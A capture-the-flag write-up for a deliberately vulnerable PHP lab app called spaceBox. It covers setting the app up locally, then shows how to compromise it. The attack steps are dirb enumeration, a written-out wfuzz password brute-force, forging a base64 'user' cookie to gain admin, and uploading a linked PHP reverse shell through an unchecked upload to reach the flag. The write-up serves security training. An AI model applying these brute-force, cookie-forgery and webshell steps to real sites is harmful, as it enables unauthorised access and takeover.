# Challenge Name: spaceBox

![date](https://img.shields.io/badge/date-09.10.2021-brightgreen.svg)  
![web category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![level](https://img.shields.io/badge/level-Easy-blue.svg)


## Description

A simple vulnerable web application. Gain access then capture the flag.

Author : Hamza Elansari @hamza07-w

Challenge link : https://github.com/hamza07-w/spaceBox



## Web app setup

For a better experience we need to setup a web server to run the web application. 

The simple way is to run it using the php web server locally ```php -S localhost:8000``` in the app folder.

I'm gonna choose Apache to have a classic situation. You can use Nginx too. 

### Apache config

I'm not really experienced with Apache so you can call me a noob if i did something wrong x)

Here is a detailed guide to how setup Apache : https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-ubuntu-18-04

I'm in Kali linux so Apache and PHP already installed.

- Switch to /var/www to create our web app folder

```
cd /var/www/
```
- Clone the app from github 
```
sudo git clone https://github.com/hamza07-w/spaceBox
```
- Remove .git/ directory and the README.md file
```
sudo rm -r spaceBox/.git/
sudo rm -r spaceBox/README.md
```

- Rename the app folder to a domain name 
```
sudo mv spaceBox/ spacebox.hkg/
```
- Let's check the app files

```
┌──(kali㉿kali)-[/var/www]
└─$ ls -la spacebox.hkg/
total 220
drwxr-xr-x 6 root root    200 Oct 10 21:18 .
drwxr-xr-x 1 root root     60 Oct 10 21:20 ..
drwxr-xr-x 3 root root    140 Oct 10 21:16 administrator
-rw-r--r-- 1 root root 210912 Oct 10 21:16 a.jpeg
drwxr-xr-x 2 root root     60 Oct 10 21:16 css
drwxr-xr-x 2 root root     80 Oct 10 21:16 img
-rw-r--r-- 1 root root    456 Oct 10 21:16 index.php
-rw-r--r-- 1 root root    460 Oct 10 21:16 pics.php
drwxr-xr-x 2 root root     80 Oct 10 21:16 posts
-rw-r--r-- 1 root root    728 Oct 10 21:16 posts.php
```
This challenge require a write permissions to be able to upload files. if upload via web server dosen't work try other solutions.

Details : https://askubuntu.com/questions/767504/permissions-problems-with-var-www-html-and-my-own-home-directory-for-a-website

- Give ownership to the webserver system user www-data
```
sudo chown -R www-data:www-data /var/www/spacebox.hkg
```
- Recursively give you read/write on the files, while giving other users (excluding www-data and root of course) no access to the files.
```
sudo find /var/www/spacebox.hkg -type f -exec setfacl -m u:www-data:rw -m other::--- {} \;
```
- Recursively give yourself read/write/traverse on the directories, remove access to the folders for other users (excluding www-data and root) and set this as the 'default' ACL for new files in the directories.
```
sudo find /var/www/spacebox.hkg -type d -exec setfacl -d -m u:www-data:rwx -m o::--- {} \;
```
- We also need to set the setgid bit for all directories, so that if you create a file the webserver can still access it as www-data via group permissions.
```
sudo find /var/www/spacebox.hkg -type d -exec chmod g+x {} \;
```


Now let's create the virtual host config file
```
sudo nano /etc/apache2/sites-available/spacebox.hkg.conf
```
```
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    ServerName spacebox.hkg
    ServerAlias www.spacebox.hkg
    DocumentRoot /var/www/spacebox.hkg
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
- Let’s enable the file with the a2ensite tool:
```
sudo a2ensite spacebox.hkg.conf
```
- Disable the default site defined in 000-default.conf:
```
sudo a2dissite 000-default.conf
```
- (Optional) Let's disable Directory indexing : to not leak challenge directories files
```
sudo nano /etc/apache2/sites-available/spacebox.hkg.conf
```
add to the config file 

```
<Directory /var/www/spacebox.hkg>
    Options -Indexes
</Directory>

```

- Next, let’s test for configuration errors:
```
sudo apache2ctl configtest
```
```
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.0.1. Set the 'ServerName' directive globally to suppress this message
Syntax OK
```
We are just running the app locally so it's ok

- Restart Apache to implement your changes:
```
sudo systemctl restart apache2
```
Now we can access the web server at http://127.0.0.1/

We can add a entry in /etc/hosts to access localhost via spacebox.hkg or www.spacebox.hkg. For others machines at the same network we can use the machine internal ip address.
- Linux : sudo nano /etc/hosts -> 127.0.0.1       localhost kali spacebox.hkg www.spacebox.hkg
- Windows example : 192.168.56.104 spacebox.hkg www.spacebox.hkg in hosts file

Let's open the web app http://www.spacebox.com/ ( http://127.0.0.1/ http://"Machine ip" )

![image](https://user-images.githubusercontent.com/72421091/136714876-590456af-1fca-4064-b7d8-cf1d8ae08b1d.png)

Now let's attack the web application

## Detailed solution

Start by opening http://www.spacebox.com/

It's just a simple php page with some links to other php files

view-source:http://spacebox.hkg/

```html
<!DOCTYPE html>
<html>
<head>
	<title>Pwn Me</title>
    <link rel="stylesheet" type="text/css" href="css/home.css">
</head>
<body>
    <ul>
        <li style="float: left;"><a href="administrator/login.php">login</a></li>
        <li><a href="pics.php">pictures</a></li>
        <li><a href="posts.php">posts</a></li>
        <li><a href="#">Home</a></li>
    </ul>
    <div class="home">
        <h1>welcome into space box</h1>
    </div>
</body>
</html>
```
Let's do some bruteforcing to find files and directories. I'll use dirb to search for directories and files with some extentions like .php,.html,.js,.css
```
==> DIRECTORY: http://spacebox.hkg/administrator/
==> DIRECTORY: http://spacebox.hkg/css/
==> DIRECTORY: http://spacebox.hkg/img/
+ http://spacebox.hkg/index.php (CODE:200|SIZE:456)
==> DIRECTORY: http://spacebox.hkg/javascript/
==> DIRECTORY: http://spacebox.hkg/posts/

---- Scanning URL: http://spacebox.hkg/ ----
+ http://spacebox.hkg/index.php (CODE:200|SIZE:456)
+ http://spacebox.hkg/pics.php (CODE:200|SIZE:460)
+ http://spacebox.hkg/posts.php (CODE:200|SIZE:463)

---- Scanning URL: http://spacebox.hkg/administrator/ ----
+ http://spacebox.hkg/administrator/cookies.php (CODE:200|SIZE:8)
+ http://spacebox.hkg/administrator/dashboard.php (CODE:403|SIZE:121)
+ http://spacebox.hkg/administrator/login.php (CODE:200|SIZE:815)
+ http://spacebox.hkg/administrator/logout.php (CODE:200|SIZE:0)

---- Scanning URL: http://spacebox.hkg/posts/ ----
+ http://spacebox.hkg/posts/1.php (CODE:200|SIZE:465)
+ http://spacebox.hkg/posts/test.php (CODE:200|SIZE:15)

---- Scanning URL: http://spacebox.hkg/css/ ----
+ http://spacebox.hkg/css/home.css (CODE:200|SIZE:1082)

---- Scanning URL: http://spacebox.hkg/posts/ ----
+ http://spacebox.hkg/posts/1.php (CODE:200|SIZE:465)
+ http://spacebox.hkg/posts/test.php (CODE:200|SIZE:15)
```

- posts/ has some php files with some text : welcome, article1
- css/home.css : juste css things no comment tags
- administrator/cookies.php : show a forbbiden text

Let's check the login page :

http://spacebox.hkg/administrator/login.php

![image](https://user-images.githubusercontent.com/72421091/136716461-9bea08a5-34dc-400c-9cab-be6652a7620f.png)

```html
<!DOCTYPE html>
<html>
<head>
  <title>space box - admin login</title>
  <link rel="stylesheet" type="text/css" href="../css/home.css">
</head>
<body>
    <ul>
        <li style="float: left;"><a href="#">login</a></li>
        <li><a href="../pics.php">pictures</a></li>
        <li><a href="../posts.php">posts</a></li>
        <li><a href="../index.php">Home</a></li>
    </ul>
    <div class="home">
      <h2>log into admin control panel</h2>
    <form method="post" action="cookies.php">
      <input class="anyinput" type="text" name="username" placeholder="username" required><br>
      <input class="anyinput" type="password" name="password" placeholder="password" required><br>
      <input type="submit" name="submit" value="login" required>
    </form>
    </div>
    <--!user: hamza!->
</body>
</html>
```

We can see a hidden comment tag  ```user: hamza```

Let's try login with the user hamza and a random password

The post login request switch to administrator/cookies.php and it's empty.

Let's bruteforce the login with the user hamza. the login is a POST request to cookies.php with username, password and sumbit=login

I'll use wfuzz we can use burp too

```
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=hamza&password=FUZZ&submit=login" --sc 302 http://spacebox.hkg/administrator/cookies.php
```
```
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000004:   302        0 L      0 W        0 Ch        "password"
```
We found the password for the user hamza it's ```password```

Let's login now with ```hamza:password```  

After the login we got a 302 redirect to index.php with a Set-Cokkie header

```
HTTP/1.1 302 Found
Date: Sat, 09 Oct 2021 23:16:17 GMT
Server: Apache/2.4.46 (Debian)
Set-Cookie: user=aGFtemE%3D
Location: ../index.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```
user=aGFtemE%3D -> url decode -> user=aGFtemE= -> base64 decode "aGFtemE=" -> hamza

So the cookie has the base64 encoded value of username

Let's check administrator/dashboard.php
- Before login in we have 403 status + text show Forbidden 403 you are not allowd to see this page :( 
![image](https://user-images.githubusercontent.com/72421091/136717517-51b38aaa-0c1a-4b6f-8820-59f5551eeb56.png)
- After login in and the Cookie is stored if we try to acces the dashboard it give us a 302 redirect to index.php so probably the user hamza can't see the dashboard

Let's change the username in cookie to admin and see 
admin -> base64 encode -> YWRtaW4= -> url encode -> YWRtaW4%3D
  -> you can use Cyberchef : https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')URL_Encode(true)&input=YWRtaW4
New cookie : user=YWRtaW4%3D

Add the new cookie and don't forget the administrator path 
![image](https://user-images.githubusercontent.com/72421091/136717914-f1b55e63-7377-4fbc-b41d-dbbfd2508944.png)

Now let's open http://spacebox.hkg/administrator/dashboard.php with the new cookie that has the admin user

![image](https://user-images.githubusercontent.com/72421091/136717993-6ff0c36d-847f-4b15-9673-796b8c0934a9.png)

We are admin now
We can see a note that tell us the upload directory which is /posts
We already found some php files after bruteforcing 1.php and test.php

Let's try upload a php code

![image](https://user-images.githubusercontent.com/72421091/136719445-0d0215e4-19fd-4898-ac8b-537e8b8a9ae0.png)

The upload files has the filename "x"php without . the posts.php need to be fixed. we can still get the php extention by adding . to article name
```
Fix posts.php : file_put_contents("posts/".$filename."php", $content); --> file_put_contents("posts/".$filename.".php", $content);
```
we can still get the php extention by adding . to article name. if you fixed the posts.php file add articles without . 

![image](https://user-images.githubusercontent.com/72421091/136719918-a3cc1f89-e8e9-4251-b911-e7e6d057afe1.png)

http://spacebox.hkg/posts/1111.php

![image](https://user-images.githubusercontent.com/72421091/136720077-5ca7d21a-0620-4afa-9bde-eac5f661cf0a.png)

We can upload php code. Let's upload a reverse shell

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Change ip to localhost if you listen from the same machine or another ip if you want to listen from another machine at the same internal network

![image](https://user-images.githubusercontent.com/72421091/136720366-69fedb49-530b-47c8-9345-ec9354434dd6.png)

Run a netcat listner

![image](https://user-images.githubusercontent.com/72421091/136720490-2249bb89-153a-428c-a5b4-cc7b734700ac.png)

Let's open the uploaded reverse shell http://spacebox.hkg/posts/shell.php

![image](https://user-images.githubusercontent.com/72421091/136720642-26e3071e-7ed2-43b4-b876-5eca6d0101c0.png)

We got the reverse shell let's check the app folder

![image](https://user-images.githubusercontent.com/72421091/136720768-82368b6e-e6a0-4424-8e72-efac867659cb.png)

We found our flag

## Flag

```
flag{4ae4a92ee0b7b95860376038423ca74783f7f99799124db57f021bbbb14ee741f4f6ff0b3f732bebf7aca59acdf103cc2e16b362cbd835401046297265097997}
```
## Feedback








